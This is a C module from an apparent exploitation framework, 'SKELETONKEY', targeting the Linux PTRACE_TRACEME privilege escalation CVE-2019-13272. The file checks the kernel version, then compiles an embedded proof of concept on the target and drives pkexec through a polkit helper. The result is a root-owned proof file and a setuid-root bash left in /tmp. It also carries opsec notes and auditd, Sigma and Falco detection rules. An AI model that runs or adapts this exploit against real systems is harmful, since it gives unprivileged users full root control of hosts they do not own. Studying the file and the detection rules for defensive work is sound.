/*
 * ptrace_traceme_cve_2019_13272 — SKELETONKEY module
 *
 * PTRACE_TRACEME on a child whose parent is mid-way through a setuid
 * execve() lets the kernel record the parent's *transient root*
 * credentials as the child's ptracer_cred. The child then execve's a
 * setuid binary of its own: because the ptrace relationship is now
 * considered privileged, that setuid execve is a *proper* (non-degraded)
 * one despite the attached tracer — so the child becomes real root while
 * still traced. The tracer injects an execveat() to re-exec a root shell.
 * Discovered by Jann Horn (Google Project Zero, June 2019, issue #1903).
 *
 * STATUS: 🟢 WORKING EXPLOIT (x86_64). Verified out-of-band on
 * Ubuntu 18.04.0 / 4.15.0-50-generic: lands uid=0 and plants a
 * root-owned proof + setuid-root bash. The exploit is the proven
 * Jann Horn / bcoles PoC, embedded (ptrace_helper_src.h), compiled at
 * runtime with unique artifact paths, run, and verified by stat()'ing
 * the root-owned artifacts — never by self-report.
 *
 * Preconditions to land root (detect() only gates on kernel version):
 *   - x86_64 target with a C compiler present (the staged execveat()
 *     technique re-execs the exploit binary; we build it on the target).
 *   - pkexec present, and at least one polkit action with
 *     implicit-active=yes pointing at an existing helper executable
 *     (auto-discovered via pkaction). On a desktop these are ubiquitous
 *     (gsd-backlight-helper, …).
 *   - An *active* local session (or an equivalently permissive polkit
 *     policy) so pkexec authorizes the helper without an interactive
 *     password. Over a bare ssh session polkit treats the session as
 *     inactive and refuses ("Not authorized") — the exploit then honestly
 *     reports EXPLOIT_FAIL. This is the real-world constraint, not a bug.
 *
 * Affected: kernels < 5.1.17 mainline. Stable backports varied; the
 * fix landed as: 5.1.17 / 5.0.20 / 4.19.58 / 4.14.131 / 4.9.182 / 4.4.182.
 *
 * No user_ns required — works on default-config systems, which is part
 * of why it's famous.
 */

#include "skeletonkey_modules.h"
#include "../../core/registry.h"

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdbool.h>
#include <unistd.h>

#ifdef __linux__

#include "../../core/kernel_range.h"
#include "../../core/host.h"
#include <errno.h>
#include <fcntl.h>
#include <signal.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/stat.h>

static const struct kernel_patched_from ptrace_traceme_patched_branches[] = {
    {4,  4, 182},
    {4,  9, 182},
    {4, 14, 131},
    {4, 19,  37},   /* Debian tracker: earlier than 4.19.58 */
    {5,  0,  20},
    {5,  1,  17},
    {5,  2,   0},   /* mainline (5.2-rc) */
};

static const struct kernel_range ptrace_traceme_range = {
    .patched_from = ptrace_traceme_patched_branches,
    .n_patched_from = sizeof(ptrace_traceme_patched_branches) /
                      sizeof(ptrace_traceme_patched_branches[0]),
};

static skeletonkey_result_t ptrace_traceme_detect(const struct skeletonkey_ctx *ctx)
{
    /* Consult the shared host fingerprint instead of calling
     * kernel_version_current() ourselves — populated once at startup
     * and identical across every module's detect(). */
    const struct kernel_version *v = ctx->host ? &ctx->host->kernel : NULL;
    if (!v || v->major == 0) {
        if (!ctx->json)
            fprintf(stderr, "[!] ptrace_traceme: host fingerprint missing kernel "
                "version — bailing\n");
        return SKELETONKEY_TEST_ERROR;
    }

    /* Bug existed since ptrace's inception (early 2.x); anything
     * pre-LTS-backport is vulnerable. Anything < 4.4 in our range
     * model defaults to vulnerable since no entry covers it. */
    if (!skeletonkey_host_kernel_at_least(ctx->host, 4, 4, 0)) {
        if (!ctx->json) {
            fprintf(stderr, "[!] ptrace_traceme: ancient kernel %s — assume VULNERABLE\n",
                    v->release);
        }
        return SKELETONKEY_VULNERABLE;
    }

    bool patched = kernel_range_is_patched(&ptrace_traceme_range, v);
    if (patched) {
        if (!ctx->json) {
            fprintf(stderr, "[+] ptrace_traceme: kernel %s is patched\n", v->release);
        }
        return SKELETONKEY_OK;
    }
    if (!ctx->json) {
        fprintf(stderr, "[!] ptrace_traceme: kernel %s in vulnerable range\n", v->release);
        fprintf(stderr, "[i] ptrace_traceme: no exotic preconditions — works on default config "
                        "(no user_ns required)\n");
    }
    return SKELETONKEY_VULNERABLE;
}

/* ---- Exploit ----------------------------------------------------
 *
 * Per Jann Horn's Project Zero issue #1903, with bcoles' helper
 * auto-targeting. The mechanism (the earlier bundled sequence had it
 * backwards — it attached to the *parent*; the real bug elevates the
 * *child*):
 *
 *   1. A "middle" process M forks a child C, then execve's
 *      `pkexec --user <me> <helper> --help`. pkexec is setuid-root, so
 *      for a window M's euid is 0.
 *   2. C spins reading /proc/M/status until it sees M is euid 0, then
 *      calls ptrace(PTRACE_TRACEME) — recording M's *root* creds as C's
 *      ptracer_cred (this is the bug: the link isn't re-derived).
 *   3. C execve's pkexec itself. Normally a traced setuid execve is
 *      degraded to non-privileged; but because ptracer_cred is root the
 *      kernel treats it as a proper suid exec — C becomes real root,
 *      still traced by M, and stops at execve's SIGTRAP.
 *   4. The main process PTRACE_ATTACHes M, injects an execveat() that
 *      re-execs the exploit binary as "stage2"; stage2 (as M) is C's
 *      tracer, so it injects an execveat() into C (now root) to re-exec
 *      as "stage3"; stage3 runs the payload as root.
 *
 * The staged self-re-exec is why the exploit binary must exist as its
 * own file with a main() that dispatches on argv[0]. We embed the proven
 * PoC (ptrace_helper_src.h — verbatim upstream but for a payload tweak),
 * compile it on the target with unique -DSK_PROOF/-DSK_ROOTBASH paths,
 * run it, and confirm root by stat()'ing the root-owned artifacts. Never
 * trust the exploit's own exit status.
 *
 * x86_64 only: the register-level injection (user_regs_struct rsp/rdi/
 * orig_rax/…) is architecture-specific.
 */

#if defined(__x86_64__)

#include "ptrace_helper_src.h"

/* Locate a usable C compiler on the target. */
static const char *ptrace_find_cc(void)
{
    static const char *ccs[] = {
        "/usr/bin/cc", "/usr/bin/gcc", "/usr/bin/clang",
        "/usr/local/bin/gcc", "/usr/local/bin/cc", NULL,
    };
    for (size_t i = 0; ccs[i]; i++) {
        if (access(ccs[i], X_OK) == 0)
            return ccs[i];
    }
    return NULL;
}

/* Write the embedded helper source to `path`. Returns 0 on success. */
static int ptrace_write_source(const char *path)
{
    int fd = open(path, O_WRONLY | O_CREAT | O_TRUNC, 0600);
    if (fd < 0) return -1;
    size_t len = sizeof(ptrace_traceme_helper_src) - 1;
    const char *p = ptrace_traceme_helper_src;
    while (len) {
        ssize_t n = write(fd, p, len);
        if (n <= 0) { close(fd); return -1; }
        p += n; len -= (size_t)n;
    }
    close(fd);
    return 0;
}

/* fork+execv a command, wait, return child exit status (or -1). */
static int ptrace_run(char *const argv[], const char *logpath, int quiet_stdin, int secs)
{
    pid_t p = fork();
    if (p < 0) return -1;
    if (p == 0) {
        if (quiet_stdin) {
            int dn = open("/dev/null", O_RDONLY);
            if (dn >= 0) { dup2(dn, 0); close(dn); }
        }
        if (logpath) {
            int lf = open(logpath, O_WRONLY | O_CREAT | O_TRUNC, 0600);
            if (lf >= 0) { dup2(lf, 1); dup2(lf, 2); close(lf); }
        }
        execv(argv[0], argv);
        _exit(127);
    }
    for (int i = 0; secs <= 0 || i < secs * 10; i++) {
        int st;
        pid_t r = waitpid(p, &st, WNOHANG);
        if (r == p) return WIFEXITED(st) ? WEXITSTATUS(st) : 128 + WTERMSIG(st);
        if (r < 0) return -1;
        usleep(100 * 1000);
    }
    kill(p, SIGKILL);
    waitpid(p, NULL, 0);
    return -2;  /* timed out */
}

/* Remember what we planted so cleanup() can remove it. */
static char ptrace_last_proof[256];
static char ptrace_last_rootbash[256];

static skeletonkey_result_t ptrace_traceme_exploit(const struct skeletonkey_ctx *ctx)
{
    skeletonkey_result_t pre = ptrace_traceme_detect(ctx);
    if (pre != SKELETONKEY_VULNERABLE) {
        fprintf(stderr, "[-] ptrace_traceme: detect() says not vulnerable; refusing\n");
        return pre;
    }
    bool is_root = ctx->host ? ctx->host->is_root : (geteuid() == 0);
    if (is_root) {
        fprintf(stderr, "[i] ptrace_traceme: already root\n");
        return SKELETONKEY_OK;
    }

    if (access("/usr/bin/pkexec", X_OK) != 0) {
        fprintf(stderr, "[-] ptrace_traceme: /usr/bin/pkexec not present — this "
                        "exploit drives pkexec; nothing to do\n");
        return SKELETONKEY_PRECOND_FAIL;
    }
    const char *cc = ptrace_find_cc();
    if (!cc) {
        fprintf(stderr, "[-] ptrace_traceme: no C compiler on target. The staged "
                        "self-re-exec technique builds a small helper on the host; "
                        "install cc/gcc or drop a prebuilt helper. Honest EXPLOIT_FAIL.\n");
        return SKELETONKEY_EXPLOIT_FAIL;
    }

    /* Unique per-run paths (pid keeps parallel runs from colliding). */
    long tag = (long)getpid();
    char src_c[256], bin[256], log[256], proof[256], rootbash[256];
    snprintf(src_c,    sizeof src_c,    "/tmp/.sk-ptrace-%ld.c",       tag);
    snprintf(bin,      sizeof bin,      "/tmp/.sk-ptrace-%ld",         tag);
    snprintf(log,      sizeof log,      "/tmp/.sk-ptrace-%ld.log",     tag);
    snprintf(proof,    sizeof proof,    "/tmp/.sk-ptrace-%ld.proof",   tag);
    snprintf(rootbash, sizeof rootbash, "/tmp/.sk-ptrace-%ld.rootbash",tag);
    snprintf(ptrace_last_proof,    sizeof ptrace_last_proof,    "%s", proof);
    snprintf(ptrace_last_rootbash, sizeof ptrace_last_rootbash, "%s", rootbash);

    if (ptrace_write_source(src_c) != 0) {
        fprintf(stderr, "[-] ptrace_traceme: could not write helper source: %s\n",
                strerror(errno));
        return SKELETONKEY_TEST_ERROR;
    }

    if (!ctx->json)
        fprintf(stderr, "[*] ptrace_traceme: building helper with %s → %s\n", cc, bin);

    char dproof[320], drootbash[320];
    snprintf(dproof,    sizeof dproof,    "-DSK_PROOF=\"%s\"",    proof);
    snprintf(drootbash, sizeof drootbash, "-DSK_ROOTBASH=\"%s\"", rootbash);
    char *cc_argv[] = {
        (char *)cc, (char *)"-O2", (char *)"-w",
        (char *)"-o", bin, src_c, dproof, drootbash, NULL,
    };
    int crc = ptrace_run(cc_argv, log, 0, 60);
    if (crc != 0) {
        fprintf(stderr, "[-] ptrace_traceme: helper compile failed (rc=%d); see %s\n",
                crc, log);
        unlink(src_c);
        return SKELETONKEY_TEST_ERROR;
    }

    if (!ctx->json)
        fprintf(stderr, "[*] ptrace_traceme: running exploit (auto-targets a polkit "
                        "helper; needs an active session to authorize pkexec)\n");

    char *run_argv[] = { bin, NULL };
    int rrc = ptrace_run(run_argv, log, 1 /*stdin=/dev/null*/, 90);
    (void)rrc;  /* exit status is NOT trusted — verify out of band below */

    /* ---- Out-of-band verification: is the proof a real, root-owned file? */
    struct stat st;
    bool rooted = (stat(proof, &st) == 0 && S_ISREG(st.st_mode) && st.st_uid == 0);

    unlink(src_c);
    unlink(bin);

    if (rooted) {
        unlink(log);
        if (!ctx->json) {
            fprintf(stderr, "[+] ptrace_traceme: ROOT — planted root-owned proof %s\n", proof);
            fprintf(stderr, "[+] ptrace_traceme: setuid-root shell available: %s -p\n", rootbash);
        }
        return SKELETONKEY_EXPLOIT_OK;
    }

    if (!ctx->json) {
        /* Distinguish "kernel not exploitable" from "environment didn't let
         * pkexec authorize" so the operator knows which lever to pull. */
        bool saw_notauth = false;
        FILE *lf = fopen(log, "r");
        if (lf) {
            char line[512];
            while (fgets(line, sizeof line, lf)) {
                if (strstr(line, "Not authorized") || strstr(line, "not authorized")) {
                    saw_notauth = true; break;
                }
            }
            fclose(lf);
        }
        fprintf(stderr, "[-] ptrace_traceme: no root artifact — honest EXPLOIT_FAIL.\n");
        if (saw_notauth) {
            fprintf(stderr, "[i] ptrace_traceme: pkexec returned \"Not authorized\" — the "
                            "session is not active/authorized for the helper action. This "
                            "exploit lands root from an *active local* session (or with a "
                            "polkit agent that authorizes it); a bare ssh session is treated "
                            "as inactive. The kernel bug is intact; the gate is polkit.\n");
        } else {
            fprintf(stderr, "[i] ptrace_traceme: no usable polkit helper found, or the race "
                            "was lost. Retry, or check `pkaction --verbose` for an action "
                            "with implicit-active=yes whose exec.path exists.\n");
        }
    }
    unlink(log);
    return SKELETONKEY_EXPLOIT_FAIL;
}

#else  /* !__x86_64__ (still Linux) */

static skeletonkey_result_t ptrace_traceme_exploit(const struct skeletonkey_ctx *ctx)
{
    (void)ctx;
    fprintf(stderr, "[-] ptrace_traceme: exploit is x86_64-only (the ptrace "
                    "register-injection is architecture-specific)\n");
    return SKELETONKEY_PRECOND_FAIL;
}

#endif /* __x86_64__ */

/* cleanup: remove the artifacts we planted, if any. */
static skeletonkey_result_t ptrace_traceme_cleanup(const struct skeletonkey_ctx *ctx)
{
    (void)ctx;
#if defined(__x86_64__)
    if (ptrace_last_proof[0])    unlink(ptrace_last_proof);
    if (ptrace_last_rootbash[0]) unlink(ptrace_last_rootbash);
#endif
    return SKELETONKEY_OK;
}

#else  /* !__linux__ */

/* Non-Linux dev builds: PTRACE_TRACEME / execveat / user_regs_struct are
 * Linux-only ABI surface. Stub out so the module still registers and the
 * top-level `make` completes on macOS/BSD dev boxes. */
static skeletonkey_result_t ptrace_traceme_detect(const struct skeletonkey_ctx *ctx)
{
    if (!ctx->json)
        fprintf(stderr, "[i] ptrace_traceme: Linux-only module "
                "(PTRACE_TRACEME cred-escalation) — not applicable here\n");
    return SKELETONKEY_PRECOND_FAIL;
}
static skeletonkey_result_t ptrace_traceme_exploit(const struct skeletonkey_ctx *ctx)
{
    (void)ctx;
    fprintf(stderr, "[-] ptrace_traceme: Linux-only module — cannot run here\n");
    return SKELETONKEY_PRECOND_FAIL;
}
static skeletonkey_result_t ptrace_traceme_cleanup(const struct skeletonkey_ctx *ctx)
{
    (void)ctx;
    return SKELETONKEY_OK;
}

#endif /* __linux__ */

static const char ptrace_traceme_auditd[] =
    "# PTRACE_TRACEME LPE (CVE-2019-13272) — auditd detection rules\n"
    "# Flag PTRACE_TRACEME (request 0) followed by parent execve of\n"
    "# a setuid binary. False positives: gdb, strace, debuggers.\n"
    "-a always,exit -F arch=b64 -S ptrace -F a0=0 -k skeletonkey-ptrace-traceme\n"
    "-a always,exit -F arch=b32 -S ptrace -F a0=0 -k skeletonkey-ptrace-traceme\n";

static const char ptrace_traceme_sigma[] =
    "title: Possible CVE-2019-13272 PTRACE_TRACEME stale-cred LPE\n"
    "id: 1a02c3a8-skeletonkey-ptrace-traceme\n"
    "status: experimental\n"
    "description: |\n"
    "  Detects ptrace(PTRACE_TRACEME) immediately followed by parent\n"
    "  execve of a setuid binary. The kernel stores the parent's pre-\n"
    "  execve credentials on the ptrace_link; after execve the link\n"
    "  is stale but ptrace still grants privileges. False positives:\n"
    "  debuggers (gdb, strace) tracing setuid processes legitimately.\n"
    "logsource: {product: linux, service: auditd}\n"
    "detection:\n"
    "  traceme: {type: 'SYSCALL', syscall: 'ptrace', a0: 0}\n"
    "  execve:  {type: 'SYSCALL', syscall: 'execve'}\n"
    "  condition: traceme and execve\n"
    "level: high\n"
    "tags: [attack.privilege_escalation, attack.t1068, cve.2019.13272]\n";

static const char ptrace_traceme_falco[] =
    "- rule: PTRACE_TRACEME followed by setuid execve (cred escalation)\n"
    "  desc: |\n"
    "    Child calls ptrace(PTRACE_TRACEME) (recording parent's pre-\n"
    "    execve creds); parent then execve's a setuid binary\n"
    "    (pkexec, su, sudo). The stale ptrace_link grants the\n"
    "    unprivileged child ptrace privileges over the now-root\n"
    "    parent. CVE-2019-13272. False positives: debuggers (gdb,\n"
    "    strace) tracing setuid processes legitimately.\n"
    "  condition: >\n"
    "    evt.type = ptrace and evt.arg.request = PTRACE_TRACEME and\n"
    "    not user.uid = 0\n"
    "  output: >\n"
    "    PTRACE_TRACEME by non-root\n"
    "    (user=%user.name pid=%proc.pid ppid=%proc.ppid)\n"
    "  priority: HIGH\n"
    "  tags: [process, mitre_privilege_escalation, T1068, cve.2019.13272]\n";

const struct skeletonkey_module ptrace_traceme_module = {
    .name           = "ptrace_traceme",
    .cve            = "CVE-2019-13272",
    .summary        = "PTRACE_TRACEME + setuid execve → non-degraded root in the traced child (pkexec helper)",
    .family         = "ptrace_traceme",
    .kernel_range   = "K < 5.1.17, backports: 5.0.20 / 4.19.58 / 4.14.131 / 4.9.182 / 4.4.182",
    .detect         = ptrace_traceme_detect,
    .exploit        = ptrace_traceme_exploit,
    .mitigate       = NULL,    /* mitigation: upgrade kernel; OR sysctl kernel.yama.ptrace_scope=2 */
    .cleanup        = ptrace_traceme_cleanup,
    .detect_auditd  = ptrace_traceme_auditd,
    .detect_sigma   = ptrace_traceme_sigma,
    .detect_yara    = NULL,
    .detect_falco   = ptrace_traceme_falco,
    .opsec_notes    = "The exploit builds a small helper on the target (needs cc/gcc) and drives pkexec against an auto-discovered polkit helper (implicit-active=yes). Audit-visible via ptrace with a0=0 (PTRACE_TRACEME) closely followed by execve of a setuid binary, plus pkexec spawning an unusual helper with --help. Requires an active local session (or a polkit agent) to authorize pkexec — over inactive ssh sessions pkexec returns \"Not authorized\" and the module reports EXPLOIT_FAIL. Artifacts: a root-owned proof file and a setuid-root bash under /tmp (removed by cleanup()); the helper .c/binary are compiled and unlinked during the run. yama ptrace_scope>=2 or SELinux deny_ptrace defeat it.",
    .arch_support   = "x86_64",
};

void skeletonkey_register_ptrace_traceme(void)
{
    skeletonkey_register(&ptrace_traceme_module);
}
